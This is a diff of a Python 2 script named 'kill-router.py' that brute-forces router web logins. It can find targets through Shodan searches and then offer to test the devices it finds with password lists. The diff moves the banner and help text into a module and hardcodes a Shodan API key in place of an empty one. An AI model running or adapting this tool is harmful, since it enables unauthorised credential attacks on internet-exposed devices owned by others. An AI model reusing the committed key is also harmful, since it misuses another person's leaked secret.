@@ -10,6 +10,8 @@ import subprocess
 from os import path
 from termcolor import colored
 
+from modules.presentations import Presentations
+
 #DIRECTORY INFOS
 CURR_PATH = path.dirname(path.realpath(__file__))
 
@@ -17,42 +19,13 @@ CURR_PATH = path.dirname(path.realpath(__file__))
 logfile = CURR_PATH+"/results.csv"
 
 # INSERT YOUR API KEY
-SHODAN_API_KEY = ""
+SHODAN_API_KEY = "BKf6OUqvUM0QCyLf3fa2Hu5iz6sFXYCT"
 api = shodan.Shodan(SHODAN_API_KEY)
 
 __AUTOR__   =   'Matheus Fidelis'
 __GITHUB__  =   'https://github.com/msfidelis'
 __BLOG__    =   'http://nanoshots.com.br'
 
-
-def banner():
-    print colored("""
-
-    ██ ▄█▀ ██▓ ██▓     ██▓        ██▀███   ▒█████   █    ██ ▄▄▄█████▓▓█████  ██▀███
-    ██▄█▒ ▓██▒▓██▒    ▓██▒       ▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
-   ▓███▄░ ▒██▒▒██░    ▒██░       ▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
-   ▓██ █▄ ░██░▒██░    ▒██░       ▒██▀▀█▄  ▒██   ██░▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄
-   ▒██▒ █▄░██░░██████▒░██████▒   ░██▓ ▒██▒░ ████▓▒░▒▒█████▓   ▒██▒ ░ ░▒████▒░██▓ ▒██▒
-   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
-   ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░     ░▒ ░ ▒░  ░ ▒ ▒░ ░░▒░ ░ ░     ░     ░ ░  ░  ░▒ ░ ▒░
-   ░ ░░ ░  ▒ ░  ░ ░     ░ ░        ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░   ░         ░     ░░   ░
-   ░  ░    ░      ░  ░    ░  ░      ░         ░ ░     ░                 ░  ░   ░
-
-								v1.0
-    """, 'red', attrs=['bold'])
-
-
-    
-def helper():
-    print colored("[*] By: Matheus Fidelis aka D0ctor", 'red', attrs=['bold'])
-    print colored("[!] Usage: ./kill-router.py -t [TARGET IP] -p [TARGET PORT] -u [USER TO TEST] -l [PATH TO PASSLIST]", 'red', attrs=['bold'])
-    print colored("[!] Usage: ./kill-router.py -t 192.168.0.1 -p 8080 -u admin -l passlist.txt", 'red', attrs=['bold'])
-    print colored("[!] Use -m to change request HTTP to HTTPS", 'red', attrs=['bold'])
-    print colored("[!] ./kill-router.py -t 192.168.0.1 -p 8080 -u admin -l passlist.txt -m https", 'red', attrs=['bold'])
-    print colored("[!] ./kill-router.py --shodan apache2", 'red', attrs=['bold'])
-    print ""
-    
-    
 
 def definedefaultpasslist():
     #Passlists Default
@@ -118,7 +91,7 @@ def shodanSearch(dork,ssl,passlist,username):
                 print '[City] %s' % result['location']['city']
                 print ''
                 
-        response = raw_input('YOU WANT TO TEST THE SHODAN RESULTS? Y/N: ')
+        response = raw_input('YOU WANT TO TEST SHODAN RESULTS? Y/N: ')
         response = response.upper().strip()
                 
         if response == "Y":
@@ -162,11 +135,11 @@ def bruteforce(target,port,ssl, passlist,username):
             validation = requests.get('https://'+url ,verify=False, timeout=8)
         else:
             validation = requests.get('http://'+url, timeout=8)
-            
+
             if validation.status_code == 200:
                 print colored("[X] INVALID TEST ", 'red', attrs=['bold'])
                 return false
-                
+
     except:
         print colored("[X] NO CONNECTION ", 'red', attrs=['bold'])
         return false
@@ -204,7 +177,7 @@ def bruteforce(target,port,ssl, passlist,username):
 
 
 def main():
-    banner()
+    Presentations.banner()
     
     target = ''
     passlist = ''
@@ -212,7 +185,7 @@ def main():
 
     #Faz o parsing dos argumentos
     parser = argparse.ArgumentParser(description = "Kill Router", add_help = False)
-    parser.add_argument('-h', '--help', action=helper(), help='usage')
+    parser.add_argument('-h', '--help', action=Presentations.helpers(), help='usage')
     parser.add_argument('-t', '--target',help='Informe o roteador alvo')
     parser.add_argument('-m', '--method',help='Informa o Método HTTP ou HTTPS')
     parser.add_argument('-p', '--port',help='Informa a porta')
@@ -226,11 +199,11 @@ def main():
     ssl = args.method
     passlist = args.passlist
     username = args.username
-    
-        
+
+
     if args.username is None:
         username = "admin"
-    
+
     #Força o valor padrão para 80 caso a porta não seja especificada.
     if port is None:
         port = 80
